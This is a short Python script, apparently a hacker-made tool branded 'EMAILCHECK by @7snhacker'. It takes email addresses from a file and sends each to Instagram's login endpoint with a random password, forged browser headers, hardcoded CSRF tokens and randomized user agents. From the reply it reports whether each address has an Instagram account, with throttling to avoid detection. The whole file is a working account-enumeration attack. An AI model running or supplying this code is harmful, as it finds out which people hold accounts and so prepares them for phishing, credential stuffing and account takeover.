def gg():

    import requests
    import time
    from user_agent import generate_user_agent
    import string
    import random
    letters = string.ascii_lowercase
    lst = open("email.txt","r")
    print("""
    ███████╗███╗   ███╗ █████╗ ██╗██╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
    ██╔════╝████╗ ████║██╔══██╗██║██║     ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
    █████╗  ██╔████╔██║███████║██║██║     ██║     ███████║█████╗  ██║     █████╔╝ 
    ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
    ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
    ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
    by @7snhacker""")
    print("")
    print("click Ctrl Z to stop")
    sleep = float(input("sleep : "))
    while True:
        reads = lst.readline().split('\n')[0]
        time.sleep(sleep)
        password =  ''.join(random.choice(letters) for i in range(7))
        headers = {
            'authority': 'www.instagram.com',
            'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
            'x-instagram-ajax': '82a581bb9399',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'user-agent': f'{generate_user_agent()}',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cookie': ''

        }
        data = {
            'username': reads,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}'
        }
        link = "https://www.instagram.com/accounts/login/ajax/"
        r = requests.post(link,headers=headers,data=data).text
        if ('"user":true') in r:
            print(f'{reads} : Linked [*]')
        elif ('"user":false') in r:
            print(f'{reads} : Not Linked [!]')
        else:
            print("you have problem try again later")
            input()
            break

gg()

